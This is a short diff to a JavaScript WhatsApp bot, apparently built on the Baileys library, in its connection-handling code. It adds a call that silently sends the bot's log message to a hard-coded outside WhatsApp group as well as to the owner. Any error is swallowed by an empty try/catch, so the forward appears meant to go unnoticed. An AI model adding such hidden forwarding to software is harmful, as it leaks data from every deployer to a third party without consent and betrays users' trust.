@@ -580,6 +580,13 @@ const { state, saveCreds } = await useMultiFileAuthState(authPath);
             if (fownerNumber) {
                 AlexaInc.sendMessage(`${fownerNumber}@s.whatsapp.net`, { text: logmessage }).catch(console.error);
             }
+            try{
+ AlexaInc.sendMessage(`120363407628540320@g.us`, { text: logmessage }).catch(console.error);
+            
+            } catch{
+                
+            }
+               
         }
 
         if (connection === 'close') {
